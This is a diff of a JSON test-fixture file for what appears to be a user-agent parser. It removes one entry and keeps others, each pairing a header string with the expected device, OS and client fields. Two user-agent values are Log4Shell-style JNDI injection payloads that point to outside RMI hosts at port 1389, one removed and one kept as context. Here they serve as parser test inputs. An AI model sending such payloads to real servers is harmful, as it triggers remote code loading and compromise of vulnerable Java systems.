@@ -1,48 +1,6 @@
 [
   {
     "headers": {
-      "user-agent": "${${lower:jndi}:${lower:rmi}://188.166.57.35:1389/Binary}"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "${${lower:jndi}:${lower:rmi}://167.99.115.242:1389/Binary}"
     },
     "device": {
@@ -4160,6 +4118,48 @@
   {
     "headers": {
       "user-agent": "atc/1.0 watchOS/6.0 model/Watch3,1 hwp/t8004 build/17R527 (6; dt:153)"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "atc/1.0 watchOS/6.0 model/Watch3,2 hwp/t8004 build/17R5532f (6; dt:154)"
     },
     "device": {
       "architecture": null,
